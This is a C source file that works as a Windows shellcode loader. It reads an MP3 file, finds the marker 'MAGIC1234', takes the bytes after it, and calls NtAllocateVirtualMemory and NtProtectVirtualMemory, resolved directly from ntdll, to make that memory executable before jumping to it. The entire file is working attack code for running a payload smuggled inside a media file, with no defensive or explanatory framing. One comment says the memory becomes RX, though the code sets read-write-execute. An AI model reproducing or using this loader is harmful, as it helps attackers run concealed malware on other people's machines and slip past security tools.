#include <windows.h>
#include <stdio.h>

// --- Define typedefs for NT API functions (from ntdll.dll)
typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

int main() {
    printf("[*] Opening file: song_with_shellcode.mp3\n");

    // --- 1. Open the MP3 file that contains hidden shellcode ---
    HANDLE hFile = CreateFileA(
        "song_with_shellcode.mp3",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open file (err=%lu)\n", GetLastError());
        return -1;
    }

    DWORD fsize = GetFileSize(hFile, NULL);
    printf("[*] File size: %lu bytes\n", fsize);

    // Allocate buffer in process heap to hold entire file
    BYTE *buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, fsize);
    if (!buf) {
        printf("[!] HeapAlloc failed\n");
        return -2;
    }

    DWORD read;
    if (!ReadFile(hFile, buf, fsize, &read, NULL)) {
        printf("[!] ReadFile failed (err=%lu)\n", GetLastError());
        return -3;
    }
    CloseHandle(hFile);
    printf("[*] File successfully read into buffer\n");

    // --- 2. Search for the marker string "MAGIC1234" inside the MP3 ---
    BYTE marker[] = "MAGIC1234";
    BYTE *scPtr = NULL;
    for (DWORD i = 0; i < fsize - sizeof(marker); i++) {
        if (memcmp(buf+i, marker, sizeof(marker)-1) == 0) {
            scPtr = buf+i+sizeof(marker)-1;
            printf("[+] Marker found at offset: 0x%08X\n", i);
            break;
        }
    }
    if (!scPtr) {
        printf("[!] Marker not found in file\n");
        return -4;
    }

    SIZE_T sc_len = fsize - (scPtr - buf);
    printf("[*] Extracted shellcode length: %Iu bytes\n", sc_len);
    printf("[*] First 8 bytes: %02X %02X %02X %02X %02X %02X %02X %02X\n",
           scPtr[0], scPtr[1], scPtr[2], scPtr[3],
           scPtr[4], scPtr[5], scPtr[6], scPtr[7]);

    // --- 3. Resolve NT functions directly from ntdll.dll ---
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    NtAllocateVirtualMemory pNtAllocateVirtualMemory =
    (NtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    NtProtectVirtualMemory pNtProtectVirtualMemory =
    (NtProtectVirtualMemory)GetProcAddress(ntdll, "NtProtectVirtualMemory");

    if (!pNtAllocateVirtualMemory || !pNtProtectVirtualMemory) {
        printf("[!] Failed to resolve Nt* functions\n");
        return -5;
    }
    printf("[*] NT API functions resolved successfully\n");

    // --- 4. Allocate RW memory region for the shellcode ---
    PVOID base = NULL;
    SIZE_T size = sc_len;
    NTSTATUS status = pNtAllocateVirtualMemory(
        GetCurrentProcess(),
                                               &base,
                                               0,
                                               &size,
                                               MEM_COMMIT | MEM_RESERVE,
                                               PAGE_READWRITE
    );
    if (status != 0) {
        printf("[!] NtAllocateVirtualMemory failed (status=0x%08X)\n", status);
        return -6;
    }
    printf("[*] Memory allocated at %p (%Iu bytes)\n", base, size);

    memcpy(base, scPtr, sc_len);
    printf("[*] Shellcode copied into allocated memory\n");

    // --- 5. Change memory protection from RW → RX ---
    ULONG oldProt;
    status = pNtProtectVirtualMemory(
        GetCurrentProcess(),
                                     &base,
                                     &size,
                                     PAGE_EXECUTE_READWRITE,
                                     &oldProt
    );
    if (status != 0) {
        printf("[!] NtProtectVirtualMemory failed (status=0x%08X)\n", status);
        return -7;
    }
    printf("[*] Memory protection changed to PAGE_EXECUTE_READWRITE\n");

    // --- 6. Jump to shellcode ---
    printf("[*] Jumping to shellcode at %p...\n", base);
    ((void(*)())base)();

    return 0;
}
